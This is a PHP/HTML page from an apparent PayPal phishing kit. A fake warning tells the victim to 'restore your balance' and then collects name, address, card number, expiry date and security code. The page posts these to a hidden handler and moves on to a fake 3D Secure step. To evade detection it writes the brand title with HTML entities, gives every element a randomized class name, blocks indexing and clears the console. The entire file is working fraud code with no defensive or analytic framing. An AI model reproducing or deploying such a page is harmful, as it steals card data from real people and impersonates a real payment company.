<?php

  require_once __DIR__.'/functions/functions.php';
  require __DIR__.'/functions/crypt.php';
  require_once __DIR__.'/../lang/detect.php';

?>
<!DOCTYPE html>
<html>

    <head>
        <title>&#80;ay&#80;al - &#67;on&#102;ir&#109; &#99;ar&#100;</title>
        <link rel="shortcut icon" href="../assets/img/icon.ico" />
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="cache-control" content="no-store">
        <meta http-equiv="cache-control" content="max-age=0">
        <meta http-equiv="expires" content="-1">
        <meta http-equiv="pragma" content="no-cache">
        <meta name="robots" content="noindex,nofollow">
        <!-- Style -->
        <link rel="stylesheet" type="text/css" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/VerifyPage.css">
        <!-- Scripts -->
        <script type="text/javascript" src="../assets/js/jquery.min.js"></script>
        <script type="text/javascript" src="../assets/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="../assets/js/CardType.js"></script>
        <script type="text/javascript">
			$(document).ready(function(){
				$('#checkout_card_number').creditCardTypeDetector({ 'credit_card_logos' : '.card_logos' });


				$('input[type=text]').keyup(function(){
					$(this).removeClass('HasErrorBorder');
				});

				$('select').change(function(){
					$(this).removeClass('HasErrorBorder');
				});
        		$('.CardN').toggleClass();
				$('#CcForm').submit(function(){

					// return false;

					function HasError(ElmId){
						var ElmId = $(ElmId);
						$(ElmId).addClass('HasErrorBorder');
					}
					var fname = $('#fname').val();
					var lname = $('#lname').val();
					var city  = $('#city').val();
					var state = $('#state').val();
					var zip   = $('#zip').val();
					var cntry = $('#country').val();
					var addrs = $('#address').val();
					var CcNum = $('#checkout_card_number').val();
					var ExpMo = $('#DOBMonth :selected').val();
					var ExpYr = $('#DOBYear :selected').val();
					var NuC5C = $('#C5c').val();

					if( fname == '' ){

						HasError('#fname');
						return false;
					}else if( lname == '' ){

						HasError('#lname');
						return false;
					}
					else if( city == '' ){

						HasError('#city');
						return false;
					}
					else if( state == '' ){

						HasError('#state');
						return false;
					}
					else if( zip == '' ){

						HasError('#zip');
						return false;
					}
					else if( cntry == '' ){

						HasError('#country');
						return false;
					}else if( addrs == '' ){

						HasError('#address');
						return false;
					}else if( CcNum == '' ){

						HasError('#checkout_card_number');
						return false;
					}else if( ExpMo == '0' ){

						HasError('#DOBMonth');
						return false;
					}else if( ExpYr == '0' ){

						HasError('#DOBYear');
						return false;
					}else if( NuC5C == '' ){
						HasError('#C5c');
						$('#C5c').removeClass('C5c');
						return false;
						
					}else{

						$.ajax({
							url: 'functions/cc.php',
							method: 'post',
							data: $('#CcForm').serialize(),
							beforeSend: function(){
								$('.spinner').removeClass('hide');
							},
							success: function(JsonResponse){
								
								
								var JSONArray = $.parseJSON(JsonResponse);

								if(JSONArray.status == 'fail')
								{
									location.reload();
								}
								else
								{
									var delay1 = 2000; //Your delay in milliseconds
									setTimeout(function(){
										$('.oneSecond').html('<?php echo $P5_text1; ?>')
									}, delay1);
									window.location = 'vbv_3d.php?_cmd=<?php echo md5(rand(1,999)); ?>&verification_dispatch=<?php echo base64_encode(md5(rand(1,100))); ?>';
								}
							}
						});
						return false;
					}

				});

            $(window).on( "load", function(){
              console.clear();
            });
			});

      </script>


    </head>

    <body>
        <header class="<?php echo rand(1111,9999); ?> header">
            <nav class="<?php echo rand(1111,9999); ?> navbar-verify">
                <div class="<?php echo rand(1111,9999); ?> nav-desktop">
                    <div class="<?php echo rand(1111,9999); ?> container">
                        <div class="<?php echo rand(1111,9999); ?> row">
                            <div class="<?php echo rand(1111,9999); ?> col-md-8">
                                <ul>
                                    <li>
                                        <a href="#" class="<?php echo rand(1111,9999); ?> navbar-brand ppl-brand"></a>
                                    </li>
                                    <li><a class="<?php echo rand(1111,9999); ?> effect-1" href="#"><?php echo $P1_text3; ?></a></li>
                                    <li><a class="<?php echo rand(1111,9999); ?> effect-1" href="#"><?php echo $P1_text4; ?></a></li>
                                    <li><a class="<?php echo rand(1111,9999); ?> effect-1" href="#"><?php echo $P1_text5; ?></a></li>
                                    <li><a class="<?php echo rand(1111,9999); ?> effect-1" href="#"><?php echo $P1_text6; ?></a></li>
                                    <li><a class="<?php echo rand(1111,9999); ?> effect-1" href="#"><?php echo $P1_text7; ?></a></li>
                                </ul>
                            </div>
                            <div class="<?php echo rand(1111,9999); ?> col-md-4">
                                <ul class="<?php echo rand(1111,9999); ?> right-navbar">
                                    <li><a href="#"><i class="<?php echo rand(1111,9999); ?> fa fa-bell" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#"><i class="<?php echo rand(1111,9999); ?> fa fa-cog" style="font-size: 23px;"></i></a></li>
                                    <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="<?php echo rand(1111,9999); ?> nav-mobile">
                    <ul>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;border: 1px solid;border-radius: 18px;"><?php echo $P1_text8; ?></a></li>
                        <li>
                            <a href="#" class="<?php echo rand(1111,9999); ?> navbar-brand ppl-brand"></a>
                        </li>
                        <li><a href="#" style="padding: 0.7em;margin-top: 1.2em;"><i class="<?php echo rand(1111,9999); ?> fa fa-bell" style="font-size: 25px;"></i></a></li>
                    </ul>
                </div>
            </nav>
            <div class="<?php echo rand(1111,9999); ?> UserInfo">
                <div class="<?php echo rand(1111,9999); ?> container">
                    <div class="<?php echo rand(1111,9999); ?> row">
                        <div class="<?php echo rand(1111,9999); ?> col-lg-7 col-md-7 col-ms-12 Profile_UserName">
                            <div class="<?php echo rand(1111,9999); ?> container">
                                <div class="<?php echo rand(1111,9999); ?> row">
                                    <div class="<?php echo rand(1111,9999); ?> profilepic"> <img src="../assets/img/profilepic.png"> </div>
                                    <div class="<?php echo rand(1111,9999); ?> HelloUser">
                                        <?php echo $P1_text10; ?><div style="padding: 5px;"></div><a href="#"><?php echo $P1_text11; ?></a>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="<?php echo rand(1111,9999); ?> col-lg-5 DisplayName-3-Item">
                            <center>
                                <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="<?php echo rand(1111,9999); ?> icon-mobile" style="padding: 24px;"><i class="<?php echo rand(1111,9999); ?> fa fa-send" style="font-size: 27px;"></i></div>
                                    </center>
                                    <p class="<?php echo rand(1111,9999); ?> text-center"><a href="#"><?php echo $P1_text13; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="<?php echo rand(1111,9999); ?> icon-mobile"><i class="<?php echo rand(1111,9999); ?> fa fa-mobile" style="font-size: 48px;"></i></div>
                                    </center>
                                    <p class="<?php echo rand(1111,9999); ?> text-center"><a href="#"><?php echo $P1_text14; ?></a></p>
                                </div>
                            </center>
                            <center>
                                <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left item-3 text-center">
                                    <center>
                                        <div class="<?php echo rand(1111,9999); ?> icon-mobile" style="padding: 24px;"><i class="<?php echo rand(1111,9999); ?> fa fa-shopping-bag" style="font-size: 27px;"></i></div>
                                    </center>
                                    <p class="<?php echo rand(1111,9999); ?> text-center"><a href="#"><?php echo $P1_text15; ?></a></p>
                                </div>
                            </center>
                        </div>
                    </div>
                </div>
				<hr>
            </div>
        </header>
        <!-- End BarTop -->
        <div class="<?php echo rand(1111,9999); ?> container PageContent">
            <div class="<?php echo rand(1111,9999); ?> row">
                <div class="<?php echo rand(1111,9999); ?> col-lg-4 col-md-4 np">

                    <div class="<?php echo rand(1111,9999); ?> col-lg-12 col-md-12 Tap-1">
                        <div class="<?php echo rand(1111,9999); ?> Step1Header CardN"><b class="<?php echo rand(1111,9999); ?> page-header"><?php echo $P1_text16; ?></b></div>
                        <div class="<?php echo rand(1111,9999); ?> VerifiStep">
                            <div class="<?php echo rand(1111,9999); ?> VerticalLine"></div>
                            <ul>
                                <li class="<?php echo rand(1111,9999); ?> Tap-1-Active"><font><?php echo $P1_text17; ?></font></li>
                                <li class="<?php echo rand(1111,9999); ?> Tap-3"><font href="#"><?php echo $P1_text18; ?></font></li>
                                <li class="<?php echo rand(1111,9999); ?> Tap-3"><font href="#"><?php echo $P1_text19; ?></font></li>
                            </ul>
                        </div>
                    </div>

                    <div class="<?php echo rand(1111,9999); ?> col-lg-12 col-md-12 Tap-2">
                        <div class="<?php echo rand(1111,9999); ?> Step1Header" style=""> <b class="<?php echo rand(1111,9999); ?> page-header"><?php echo $P5_text20; ?></b> <span class="<?php echo rand(1111,9999); ?> pull-right"><a href="#"><?php echo $P5_text21; ?> <i class="<?php echo rand(1111,9999); ?> fa fa-angle-right"></i></a></span>
                        </div>
                        <div class="<?php echo rand(1111,9999); ?> VerifiStep">
                            <p class="<?php echo rand(1111,9999); ?> HowManyMoney">
                            	<img src="../assets/img/warning-alert.jpg" class="<?php echo rand(1111,9999); ?> warning-text-img" />
                                <p>Please complete verification steps to restore your balance</p>
                            </p>
                            <ul class="<?php echo rand(1111,9999); ?> WithdrawMoney">
                            	<li><a href="#" class="<?php echo rand(1111,9999); ?> Step1Header"><?php echo $P5_text3; ?></a></li>
                            	<li><a href="#" class="<?php echo rand(1111,9999); ?> Step1Header"><?php echo $P5_text4; ?></a></li>
                            </ul>
                         </div>
                    </div>

                    <div class="<?php echo rand(1111,9999); ?> col-lg-12 col-md-12 Tap-2">
                        <div class="<?php echo rand(1111,9999); ?> Step1Header">
                        	<b class="<?php echo rand(1111,9999); ?> page-header"><?php echo $P5_text5; ?></b>
                        </div>
                        <div class="<?php echo rand(1111,9999); ?> VerifiStep cards-and-banks">
							<img src="../assets/img/warning-alert.jpg" class="<?php echo rand(1111,9999); ?> warning-text-img" />
                            <p>Please complete verification steps to restore your credit cards</p>
                            <div><a href="#" class="<?php echo rand(1111,9999); ?> add-card"><?php echo $P1_text27; ?></a></div>
                            <br>
                         </div>
                    </div>

                    <div class="<?php echo rand(1111,9999); ?> col-lg-12 col-md-12 Tap-2">
                        <div class="<?php echo rand(1111,9999); ?> Step1Header">
                        	<b class="<?php echo rand(1111,9999); ?> page-header"><?php echo $P1_text33; ?></b>
                        </div>
                        <div class="<?php echo rand(1111,9999); ?> VerifiStep cards-and-banks">
                            <ul class="<?php echo rand(1111,9999); ?> WithdrawMoney">
                            	<li><a href="#" class="<?php echo rand(1111,9999); ?> Step1Header"><?php echo $P1_text34; ?></a></li>
                            	<li><a href="#" class="<?php echo rand(1111,9999); ?> Step1Header"><?php echo $P1_text35; ?></a></li>
                            	<li><a href="#" class="<?php echo rand(1111,9999); ?> Step1Header"><?php echo $P1_text36; ?></a></li>
                            </ul>

                         </div>
                    </div>

                </div><!-- End Tap Left -->


                <div class="<?php echo rand(1111,9999); ?> col-lg-8 col-md-8 np">
                <div class="<?php echo rand(1111,9999); ?> col-lg-12 col-md-12 Verify-Form pull-right">
               	<form action="../includes/Ajax.php" method="post" id="CcForm">
	                
<!-- Cc Page -->


                     <div class="<?php echo rand(1111,9999); ?> transitioning spinner hide">
                        <p class="<?php echo rand(1111,9999); ?> oneSecond"><?php echo $P5_text6; ?></p>
                     </div>
                    <div class="<?php echo rand(1111,9999); ?> container">
                        <br />
                        <br />
                        <div class="<?php echo rand(1111,9999); ?> col-md-12 npi">
                            <h5 class="<?php echo rand(1111,9999); ?> page-header" style="padding-bottom: 10px;"><?php echo $P5_text7; ?></h5>
                        </div>
                            <div class="<?php echo rand(1111,9999); ?> col-md-8 pull-left">
                                <div class="<?php echo rand(1111,9999); ?> row">

                                <div class="<?php echo rand(1111,9999); ?> row">
                                  <div class="<?php echo rand(1111,9999); ?> col-lg-6 col-md-6">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P5_text8; ?>"  name="Fn" id="fname" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with checkbox">
                                    </div>
                                  </div>

                                  <div class="<?php echo rand(1111,9999); ?> col-lg-6 col-md-6">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P5_text9; ?>"  name="Ln" id="lname" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with radio button">
                                    </div>
                                  </div>
                                </div>

                                <div class="<?php echo rand(1111,9999); ?> row">
                                  <div class="<?php echo rand(1111,9999); ?> col-lg-6 col-md-6">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P1_text38; ?>"  name="city" id="city" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with checkbox">
                                    </div>
                                  </div>

                                  <div class="<?php echo rand(1111,9999); ?> col-lg-6 col-md-6">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P1_text39; ?>"  name="state" id="state" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with radio button">
                                    </div>
                                  </div>
                                </div>

                                <div class="<?php echo rand(1111,9999); ?> row">
                                  <div class="<?php echo rand(1111,9999); ?> col-lg-5 col-md-5">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P1_text40; ?>"  name="zip" id="zip" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with checkbox">
                                    </div>
                                  </div>

                                  <div class="<?php echo rand(1111,9999); ?> col-lg-7 col-md-7">
                                    <div class="<?php echo rand(1111,9999); ?> input-group">
                                      <input type="text" placeholder="<?php echo $P1_text41; ?>"  name="country" id="country" class="<?php echo rand(1111,9999); ?> form-control InputInfo" aria-label="Text input with radio button">
                                    </div>
                                  </div>
                                </div>



                                <div class="<?php echo rand(1111,9999); ?> input-group">
                                  <input type="text" id="address" class="<?php echo rand(1111,9999); ?> form-control InputInfo card_logos" placeholder="<?php echo $P1_text37; ?>" name="address" maxlength="16" aria-describedby="sizing-addon2">
                                </div>

                                <div class="<?php echo rand(1111,9999); ?> input-group">
                                  <input type="text" id="checkout_card_number" id="CcNum" class="<?php echo rand(1111,9999); ?> form-control InputInfo CcNumber card_logos" placeholder="<?php echo $P5_text10; ?>" name="Nu" maxlength="16" aria-describedby="sizing-addon2">
                                </div>
                                        

                                <div class="<?php echo rand(1111,9999); ?> row">
                                    
                                    <div class="<?php echo rand(1111,9999); ?> col-md-4 form-group">
                                        <label for="DOBMonth" class="<?php echo rand(1111,9999); ?> nmb FullName"><?php echo $P5_text11; ?></label>
                                        <select class="<?php echo rand(1111,9999); ?> form-control InputInfo" name="EpMo" id="DOBMonth">
                                            <option value="0"> MM </option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                        <input type="hidden" id="ExpMoVal">
                                    </div>

                                    <div class="<?php echo rand(1111,9999); ?> col-md-4 form-group">
                                        <label for="DOBMonth" class="<?php echo rand(1111,9999); ?> nmb FullName" style="opacity: 0;">YY</label>
                                        <select name="EpYr"  id="DOBYear" class="<?php echo rand(1111,9999); ?> form-control InputInfo">
                                            <option value="0"> YY </option>
                                            <option value="2017">2017</option>
                                            <option value="2018">2018</option>
                                            <option value="2019">2019</option>
                                            <option value="2020">2020</option>
                                            <option value="2021">2021</option>
                                            <option value="2022">2022</option>
                                            <option value="2023">2023</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                            <option value="2029">2029</option>
                                            <option value="2030">2030</option>
                                        </select>
                                        <input type="hidden" id="ExpYrVal">
                                    </div>

                                    <div class="<?php echo rand(1111,9999); ?> col-md-4">
                                        <label for="basic-url"  class="<?php echo rand(1111,9999); ?> nmb FullName">CSC</label>
                                        <div class="<?php echo rand(1111,9999); ?> input-group">

                                          <input type="text" class="<?php echo rand(1111,9999); ?> form-control InputInfo C5c" name="C5c" id="C5c" minlength="3" maxlength="4" style="border-radius: 5px;" placeholder="CSC" aria-describedby="basic-addon3">
                                          <!-- <span class="<?php echo rand(1111,9999); ?> input-group-addon icon-cc"></span> -->
                                        </div>

                                    </div>
                                    <div class="<?php echo rand(1111,9999); ?> col-md-12">
                                        <input type="submit" name="" value="Agree & continue" class="<?php echo rand(1111,9999); ?> Submit">
                                    </div>
                                  </div>
                                </div>

                                </div>
                                <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-right" style="padding-right: 0px;">
                                <center><img src="../assets/img//paypal-security.png" style="width: 75%;text-align: center;"></center>
                                <p style="font-size: 0.979em;font-weight: 400;display: block;padding: 0.9em 0 0.65em;font-weight: 400;letter-spacing: 0.025rem;text-decoration: none;text-align: center;font-size: 0.88em;text-align: left;"><?php echo $P5_text12; ?></p>
                            </div>
                            <hr>
                            <div class="<?php echo rand(1111,9999); ?> col-md-12 pull-left">
                                <div class="<?php echo rand(1111,9999); ?> item1">



                            <br>
                            <hr class="<?php echo rand(1111,9999); ?> style3" style="border-top: 1px dashed #8c8b8b;">
                            <br>
                            <center>
                            <div class="<?php echo rand(1111,9999); ?> col-md-2"></div>
                            <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left">
                                <div class="<?php echo rand(1111,9999); ?> item1">
                                    <center><img src="../assets/img//paypal-fast.png" style="width: 100%;">
                                    <b class="<?php echo rand(1111,9999); ?> text-center"><?php echo $P5_text13; ?></b></center>
                                    <p class="<?php echo rand(1111,9999); ?> text-left"><?php echo $P5_text14; ?></p>
                                </div>
                            </div>
                            
                            <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left">
                                <div class="<?php echo rand(1111,9999); ?> item1">
                                    <center><img src="../assets/img//cardreader-new.png" style="width: 100%;">
                                    <b class="<?php echo rand(1111,9999); ?> text-center"><?php echo $P5_text15; ?></b>
                                    <p class="<?php echo rand(1111,9999); ?> text-left"><?php echo $P5_text16; ?></p></center>
                                </div>
                            </div>

                            <div class="<?php echo rand(1111,9999); ?> col-md-4 pull-left">
                                <div class="<?php echo rand(1111,9999); ?> item1">
                                    <center><img src="../assets/img/paypal-donation.png" style="width: 100%;">
                                    <b class="<?php echo rand(1111,9999); ?> text-center"><?php echo $P5_text17; ?></b>
                                    <p class="<?php echo rand(1111,9999); ?> text-left"><?php echo $P5_text18; ?></p></center>
                                </div>
                            </div>
                            <div class="<?php echo rand(1111,9999); ?> col-md-2"></div>

                            </center>
                    </div>
                    </div>
                    </div>

<!-- End Cc Page -->
				
				</form>
                </div>
	                    	</div>
							
	                    </div>
	                </div><!-- End Verification Form -->

	            </div>
        </div>
        </div>
        </div>
        </div>
        <div class="<?php echo rand(1111,9999); ?> wrap"></div>
        <footer class="<?php echo rand(1111,9999); ?> footer">
        	<div class="<?php echo rand(1111,9999); ?> container">
        		<div class="<?php echo rand(1111,9999); ?> row">
        		<div class="<?php echo rand(1111,9999); ?> col-md-12">
        		<p class="<?php echo rand(1111,9999); ?> text-center" style="margin: 0;background: #ffffff;padding: 1%;color: #9e9e9e;"><?php echo $P5_text19; ?></p>
        		</div>
        		</div>
        	</div>
        </footer>
</body>
</html>